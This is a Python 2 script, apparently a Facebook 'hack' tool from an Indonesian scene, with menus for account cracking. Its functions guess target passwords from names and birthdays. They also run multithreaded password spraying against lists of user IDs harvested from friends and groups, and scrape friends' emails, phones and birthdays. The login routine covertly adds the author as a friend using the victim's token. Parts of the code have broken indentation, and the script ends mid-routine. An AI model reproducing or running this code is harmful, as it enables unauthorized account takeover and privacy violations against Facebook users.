#!/usr/bin/python
# -*- coding: utf-8 -*-
# Life Of Programmer
# Modified By The Sixty Nine

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError
from mechanize import Browser

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
    print ''
    print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mExit'
    print ''
    print ''
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo = """
\x1b[106;96m[]\x1b[100;90m[]\x1b[0m~\x1b[4m\x1b[101;1m H e k \x1b[104;1mP e s b u k \033[0m~\x1b[103;93m[]\x1b[102;92m[]\x1b[105;95m[]\x1b[107;97m[]\x1b[0m
\x1b[1;77m      * Coded by Nedi\x1b[0m
"""

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mLoading \x1b[0m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[0mNot Vuln'
vuln = '\x1b[0mVuln'

def login():
    os.system('clear')
    os.system('reset')
    time.sleep(1)
    print ''
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        print '\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[0mPlease Login Account Pesbuk \x1b[0m[\x1b[91;1m/\x1b[0m]'
        id = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mEmail \x1b[0m:\x1b[77;1m ')
        pwd = getpass.getpass('\x1b[0m[\x1b[93;1m+\x1b[0m] \x1b[0mPassword \x1b[0m:\x1b[0m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[0m[\x1b[96;1m!\x1b[0m] \x1b[77;1mNo connection network'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mLogin success'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://www.youtube.com/channel/UCpVqkAi_sqVf-ZPwzRjME0Q')
                time.sleep(1)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mNo connection network'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Has Baned Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mOpen not found'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()

def menu():
    try:                                                                                                                                                                                toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            os.system('reset')
            print ''
            print logo
            print ''
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Has Baned Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print ''
            print logo
            print ''
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mNo connection network'
            keluar()

    os.system('clear')
    os.system('reset')
    print ''
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[92;1m#\x1b[0m] \x1b[77;1mName   : \x1b[0m' + nama + (39 - len(nama)) * '\x1b[0m '+''
    print '\x1b[0m[\x1b[95;1m@\x1b[0m] \x1b[77;1mID     : \x1b[0m' + id + (39 - len(id)) *     '\x1b[0m '+''
    print '\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mFollow : \x1b[0m' + sub + (39 - len(sub)) *   '\x1b[0m '+''
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mUser Information'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mHack Facebook Account'
    print '\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mBot'
    print '\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mOthers'
    print '\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mUpdate'
    print '\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mLogout'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mExit'
    print ''
    pilih()
def pilih():
    zedd = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if zedd == '':
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        pilih()
    else:
        if zedd == '1':
            informasi()
        else:
            if zedd == '2':
                menu_hack()
            else:
                if zedd == '3':
                    menu_bot()
                else:
                    if zedd == '4':
                        lain()
                    else:
                        if zedd == '5':
                            os.system('clear')
                            os.system('reset')
                            print ''
                            print logo
                            print ''
                            os.system('git pull origin master')
                            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                            menu()
                        else:
                            if zedd == '6':
                                os.system('rm -rf login.txt')
                                os.system('xdg-open https://m.facebook.com/rizz.magizz')
                                keluar()
                            else:
                                if zedd == '0':
                                    keluar()
                                else:
                                    print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + zedd + ' \x1b[77;1mNot availabel'
                                    pilih()

def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    id = raw_input('\x1b[0m[\x1b[92;1m?\x1b[0m] \x1b[77;1mInput ID/Name: \x1b[0m')
    jalan('\x1b[0m[\x1b[95;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mProcessing \x1b[77;1m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            try:
                print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mName\x1b[77;1m          : ' + z['name']
            except KeyError:
                print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mName\x1b[77;1m          : \x1b[77;1mNot found'
            else:
                try:
                    print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mId\x1b[77;1m            : ' + z['id']
                except KeyError:
                    print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mId\x1b[77;1m            : \x1b[77;1mNot found'
                else:
                    try:
                        print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mEmail\x1b[77;1m         : ' + z['email']
                    except KeyError:
                        print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mEmail\x1b[77;1m         : \x1b[77;1mNot found'
                    else:
                        try:
                            print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPhone Number\x1b[77;1m  : ' + z['mobile_phone']
                        except KeyError:
                            print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mPhone Number\x1b[77;1m  : \x1b[77;1mNot found'

                        try:
                            print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mLocation\x1b[77;1m      : ' + z['location']['name']
                        except KeyError:
                            print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mLocation\x1b[77;1m      : \x1b[77;1mNot found'

                    try:
                        print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mBirthday\x1b[77;1m      : ' + z['birthday']
                    except KeyError:
                        print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mBirthday\x1b[77;1m      : \x1b[77;1mNot found'

                try:
                    print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mSchool\x1b[77;1m        : '
                    for q in z['education']:
                        try:
                            print '\x1b[0m                   ~ \x1b[77;1m' + q['school']['name']
                        except KeyError:
                            print '\x1b[0m                   ~ \x1b[77;1mNot found'

                except KeyError:
                    pass

            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu()
    else:
        print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mUser not found'
        raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
        menu()

def menu_hack():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mMini Hack Facebook (\x1b[0mTarget\x1b[0m)'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mMulti Bruteforce Facebook'
    print '\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mSuper Multi Bruteforce Facebook'
    print '\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mBruteForce (\x1b[0mTarget\x1b[0m)'
    print '\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mYahoo Checker'
    print '\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mGet ID/Email/HP'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mBack'
    print ''
    hack_pilih()


def hack_pilih():
    hack = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if hack == '':
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        hack_pilih()
    else:
        if hack == '1':
            mini()
        else:
            if hack == '2':
                crack()
                hasil()
            else:
                if hack == '3':
                    super()
                else:
                    if hack == '4':
                        brute()
                    else:
                        if hack == '5':
                            menu_yahoo()
                        else:
                            if hack == '6':
                                grab()
                            else:
                                if hack == '0':
                                    menu()
                                else:
                                    print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0] ' + hack + ' \x1b[77;1mNot found'
                                    hack_pilih()
def mini():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        print '\x1b[0m[ \x1b[94;1mINFO \x1b[0m] \x1b[77;1mTarget must be your friend!'
        print ''
        try:
            id = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID Target :\x1b[77;1m ')
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
            print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mName\x1b[77;1m : ' + a['name']
            jalan('\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[77;1mChecking \x1b[77;1m...')
            time.sleep(2)
            jalan('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mOpen security \x1b[77;1m...')
            time.sleep(2)
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            print ''
            pz1 = a['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz1
                raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                menu_hack()
            else:
                if 'www.facebook.com' in y['error_msg']:
                    print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                    print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Maybe Checkpoint'
                    print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                    print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                    print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz1
                    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                    menu_hack()
                else:
                    pz2 = a['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                        print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                        print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                        print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz2
                        raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                        menu_hack()
                     else:
                        if 'www.facebook.com' in y['error_msg']:
                            print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Maybe Checkpoint'
                            print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                            print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                            print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz2
                            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                            menu_hack()
                        else:
                            pz3 = a['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                                print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                                print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                                print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz3
                                raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                                menu_hack()
                            else:
                                if 'www.facebook.com' in y['error_msg']:
                                    print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                                    print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Maybe Checkpoint'
                                    print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']
                                    print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                                    print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz3
                                    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                                    menu_hack()
                                else:
                                    lahir = a['birthday']
                                    pz4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    y = json.load(data)                                                                                                                                                             
                                    if 'access_token' in y:                                                                                                                                                             
                                        print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'
                                        print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']                                                                                         
                                        print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                                        print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPassword\x1b[77;1m : ' + pz4
                                        raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                                        menu_hack()
                                    else:
                                        if 'www.facebook.com' in y['error_msg']:
                                            print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFounded.'                                                                                                                          
                                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Maybe Checkpoint'
                                            print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName\x1b[77;1m     : ' + a['name']                                                                                         
                                            print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mUsername\x1b[77;1m : ' + id
                                            print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[m0] \x1b[0mPassword\x1b[77;1m : ' + pz4
                                            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')                                                                                                                                 
                                            menu_hack()
                                        else:
                                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mSorry, opening password target failed :('                                                                                          
                                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTry other method.'                                                                                                                 
                                            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                                            menu_hack()                                                                                                                                 
                                            except KeyError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTerget not found'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_hack()

def crack():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()                                                                                                                                       
        except IOError:                                                                                                                                                                     
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'                                                                                                                   
            os.system('rm -rf login.txt')
        time.sleep(1)                                                                                                                                                                   
        login()
    else:                                                                                                                                                                               
        os.system('clear')
        os.system('reset')
        print ''
        print logo                                                                                                                                                                      
        print ''                                                                                                                                                                        
        idlist = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mFile ID : \x1b[0m')
        passw = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mPassword : \x1b[0m')                                                                                                   
        try:
            file = open(idlist, 'r')
            jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)                                                                                                                                            
            for zedd in threads:             
                zedd.join()

        except IOError:                                                                                                                                                                     
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mFile not found'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            menu_hack()
def scrak():
    global back
    global success                                                                                                                                                                                                                                                                                                              
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Success.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                success.append('\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + username + ' | ' + passw)
                back += 1
            else:
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Cekpoint.txt', 'w')
                    cek.write(username + ' | ' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[0m[\x1b[91;1m\xe2\x9c\x9a\x1b[0m] ' + username + ' | ' + passw)
                    back += 1
                else:
                    gagal.append(username)
                    back += 1
            sys.stdout.write('\r\x1b[0m[\x1b[95;1m\xe2\x9c\xb8\x1b[0m] \x1b[77;1mCrack    \x1b[77;1m:\x1b[77;1m ' + str(back) + ' \x1b[0m>\x1b[77;1m ' + str(len(up)) + ' =>\x1b[0mLive\x1b[77;1m:\x1b[77;1m' + str(len(success)) + ' \x1b[0m=>\x1b[0mCheck\x1b[77;1m:\x1b[77;1m' + str(len(cekpoint)))
            sys.stdout.flush()

    except IOError:
        print '\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mConnection busy'
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mNo connection network'


def hasil():
    print''
    for b in success:
        print b

    for c in cekpoint:
        print c

    print
    print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mFailed \x1b[0m--> ' + str(len(gagal))
    keluar()

def super():
    global toket
    os.system('clear')                                                                                                                                                              try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mCrack from Friends'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mCrack from Group'
    print '\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mCrack from File'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mBack'
    print ''
    pilih_super()


def pilih_super():
    peak = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if peak == '':                                                                                                                                                                      
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCan\'t empty'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            os.system('reset')
            print ''
            print logo
            print ''
            jalan('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mInput ID from friend \x1b[77;1m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                os.system('reset')
                print ''
                print logo
                print ''
                idg = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID Group :\x1b[77;1m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)                                                                                                                                                        
                    print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mGroup name :\x1b[77;1m ' + asw['name']
                except KeyError:
                    print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGroup not found'
                    raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                    super()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])
                    
            else:
                if peak == '3':
                    os.system('clear')
                    os.system('reset')
                    print ''
                    print logo
                    print ''
                    try:
                        idlist = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mFile ID : \x1b[77;1m')
                        for line in open(idlist,'r').readlines():                                                                                                                                       <------>id.append(line.strip())
                    except IOError:
                        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mFile not found'
                        raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
                        super()

                else:
                    if peak == '0':
                        menu_hack()
                    else:
                        print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + peak + ' \x1b[77;1mNot found'
                        pilih_super()
    print '\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[0mTotal ID : \x1b[77;1m' + str(len(id))
    jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[0m[\x1b[94;1m\xe2\x9c\xb8\x1b[0m] \x1b[77;1mCrack \x1b[77;1m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print
